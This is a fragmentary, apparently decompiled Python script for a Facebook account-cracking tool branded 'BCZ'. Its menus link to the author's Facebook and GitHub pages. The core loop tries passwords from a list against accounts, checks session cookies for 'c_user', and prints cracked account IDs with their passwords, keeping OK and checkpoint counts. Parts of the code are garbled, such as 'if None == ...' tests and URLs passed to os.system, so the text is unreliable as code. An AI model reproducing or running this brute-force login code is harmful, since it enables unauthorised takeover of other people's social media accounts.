...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('www.facebook.com/sagor.official.0')
        FD()
        return None
...
def o():
    ...
    jalan(' \x1b[1;32m[4] \x1b[1;32mFOLLOW MY GITHUB')
    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if None == '2':
        ('https://www.facebook.com/sagor.official.0')
        return None
    if None == '3':
        os.system('www.facebook.com/sagor.official.0')
        return None
    if None == '4':
        os.system('https://github.com/Sagor-BCZ')
        return None
    if None == '0':
        os.system('exit')
        return None
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(BCZ-CP??)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[BCZ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
